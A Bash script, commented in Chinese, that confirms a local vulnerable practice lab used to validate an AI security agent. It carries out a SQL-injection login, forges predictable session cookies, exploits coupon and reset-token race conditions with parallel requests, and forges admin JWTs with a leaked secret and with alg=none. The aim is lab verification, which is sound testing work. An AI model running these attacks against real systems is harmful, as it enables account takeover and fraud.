#!/usr/bin/env bash
# 验证靶场 v0.4 新增的三类漏洞确实可复现（竞态 / 认证实现）。
#
# 为什么要有这个脚本：靶场是 HexHound 能力验证集——**靶场里不成立的东西，
# 就没资格说"我们能测"**。这里用最朴素的手工请求把三类问题各复现一遍，
# 与 agent 跑出来的结论对照（agent 用 sandbox_script 打的应是同一批接口）。
#
# 用法（在 WSL 里跑，靶场监听 127.0.0.1:5000）：
#   wsl -d Ubuntu-24.04 -u root -- bash /mnt/c/.../tools/verify_lab_new_vulns.sh
set -uo pipefail

BASE="${1:-http://127.0.0.1:5000}"
COOKIE="$(mktemp)"
PASS=0
FAIL=0

ok()   { echo "  [OK] $1"; PASS=$((PASS + 1)); }
bad()  { echo "  [XX] $1"; FAIL=$((FAIL + 1)); }

echo "== 靶场：${BASE} =="

echo
echo "[1] 竞态：单次优惠券并发重复兑换"
# 用 SQL 注入登录拿到 alice 的会话（靶场漏洞 1），先证明登录链可用
curl -s -c "$COOKIE" -X POST \
  --data-urlencode "username=alice' OR '1'='1'-- -" --data "password=x" \
  "${BASE}/login" > /dev/null
who="$(grep -o 'hh_session[[:space:]].*' "$COOKIE" | awk '{print $NF}')"
if [ -n "$who" ]; then ok "SQL 注入登录成功，会话 cookie：${who}"; else bad "登录失败"; fi

# 靶场状态在内存里且"每用户一次性"——为了脚本可重复运行，这里直接**伪造一个全新用户**的
# 会话（`名字:tok-名字-demo` 正是靶场的可预测令牌缺陷）。顺带说明：这个缺陷本身也是
# 报告里"会话令牌可预测"那一条的复现方式。
USER_NAME="hh-verify-${RANDOM}${RANDOM}"
# 注意 cookie 文件必须是完整的 Netscape 七字段格式，否则 curl 会**静默忽略**它
# （踩过：只写 "name<TAB>value" 两列 → 服务端看到匿名 → 报"请先登录"）。
printf '127.0.0.1\tFALSE\t/\tFALSE\t0\thh_session\t%s:tok-%s-demo\n' \
  "$USER_NAME" "$USER_NAME" > "$COOKIE"
echo "     伪造会话（可预测令牌）：${USER_NAME}:tok-${USER_NAME}-demo"

balance_before="$(curl -s -b "$COOKIE" "${BASE}/wallet" | python3 -c 'import json,sys;print(json.load(sys.stdin)["balance"])')"

# 串行第一次应成功、第二次应 409（说明"逻辑上"是单次券）
# 注意：Flask 的 jsonify 默认把中文转义成 \uXXXX，所以**不能用 grep 匹配中文字面量**，
# 一律解析 JSON 的 code 字段（这里踩过：明明复现成功却报 0 次）。
first="$(curl -s -b "$COOKIE" -X POST -d 'code=HH-RACE-100' "${BASE}/coupon")"
second="$(curl -s -b "$COOKIE" -X POST -d 'code=HH-RACE-100' "${BASE}/coupon")"
first_ok="$(echo "$first" | python3 -c 'import json,sys;print(int(json.load(sys.stdin).get("code")==0))' 2>/dev/null || echo 0)"
second_ok="$(echo "$second" | python3 -c 'import json,sys;print(int(json.load(sys.stdin).get("code")==0))' 2>/dev/null || echo 0)"
if [ "$first_ok" = "1" ]; then ok "串行第 1 次：成功"; else bad "串行第 1 次未成功：$first"; fi
if [ "$second_ok" = "0" ]; then ok "串行第 2 次：被拒（逻辑上是单次券）"; else bad "串行第 2 次未被拒：$second"; fi

# 并发 6 发同一张券：应只有 1 次成功，多余的成功即为竞态
RACE_OUT="$(mktemp)"
for i in $(seq 1 6); do
  curl -s -b "$COOKIE" -X POST -d 'code=HH-ONCE-200' "${BASE}/coupon" >> "$RACE_OUT" &
done
wait
concurrent_ok="$(python3 - "$RACE_OUT" <<'PY'
import json, sys
hits = 0
for line in open(sys.argv[1], encoding="utf-8"):
    line = line.strip()
    if not line:
        continue
    try:
        hits += int(json.loads(line).get("code") == 0)
    except ValueError:
        pass
print(hits)
PY
)"
rm -f "$RACE_OUT"
balance_after="$(curl -s -b "$COOKIE" "${BASE}/wallet" | python3 -c 'import json,sys;print(json.load(sys.stdin)["balance"])')"
if [ "$concurrent_ok" -gt 1 ]; then
  ok "并发 6 发同一张券：成功 ${concurrent_ok} 次（竞态成立）"
else
  bad "并发 6 发只有 ${concurrent_ok} 次成功——靶场竞态窗口可能失效"
fi
echo "     余额：${balance_before} → ${balance_after}（HH-RACE-100 计 100，HH-ONCE-200 每张 200）"

echo
echo "[2] 竞态：一次性重置令牌并发消费"
for i in $(seq 1 6); do
  curl -s -X POST -d 'token=reset-bob-0002&username=bob' "${BASE}/api/reset_token" >> /tmp/hh_reset_out.txt &
done
wait
issued="$(grep -c '"session"' /tmp/hh_reset_out.txt || true)"
rm -f /tmp/hh_reset_out.txt
if [ "$issued" -gt 1 ]; then ok "并发消费同一重置令牌：签发 ${issued} 个会话（竞态成立）"; else bad "只签发 ${issued} 个会话"; fi

echo
echo "[3] 认证实现：泄露密钥 + alg=none 伪造管理员令牌"
python3 - "$BASE" <<'PY'
import base64, hashlib, hmac, json, sys, urllib.request

base = sys.argv[1]
leaked = "hexhound-demo-jwt-secret-do-not-use"   # 来自 /actuator/env 的 app.jwt.secret


def b64(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


def sign(payload: dict, alg: str = "HS256", secret: str = leaked) -> str:
    head = b64(json.dumps({"alg": alg, "typ": "JWT"}, separators=(",", ":")).encode())
    body = b64(json.dumps(payload, separators=(",", ":")).encode())
    if alg.lower() == "none":
        return f"{head}.{body}."
    sig = hmac.new(secret.encode(), f"{head}.{body}".encode(), hashlib.sha256).digest()
    return f"{head}.{body}.{b64(sig)}"


def export(token: str) -> tuple[int, str]:
    req = urllib.request.Request(
        base + "/api/admin/export", headers={"Authorization": f"Bearer {token}"}
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            return resp.status, resp.read(120).decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read(120).decode("utf-8", "replace")


status, _ = export("")
print(f"     无令牌 → HTTP {status}" + ("  [OK] 确实受保护" if status == 401 else "  [XX] 竟然放行"))

status, _ = export(sign({"user": "attacker", "role": "user"}))
print(f"     合法签名但 role=user → HTTP {status}" + ("  [OK] 权限判定生效" if status == 403 else "  [XX] 越权"))

status, body = export(sign({"user": "attacker", "role": "admin"}))
print(f"     泄露密钥自签 role=admin → HTTP {status}" + ("  [OK] 伪造成功（漏洞成立）" if status == 200 else f"  [XX] 失败：{body}"))

status, _ = export(sign({"user": "attacker", "role": "admin"}, alg="none"))
print(f"     alg=none 无签名 → HTTP {status}" + ("  [OK] 接受无签名令牌（漏洞成立）" if status == 200 else "  [XX] 被拒绝"))
PY

echo
echo "== 汇总：${PASS} 项符合预期，${FAIL} 项异常 =="
echo "说明：本脚本只读/仅触发靶场自身的重复发放，用于确认靶场漏洞真实存在。"
[ "$FAIL" -eq 0 ]
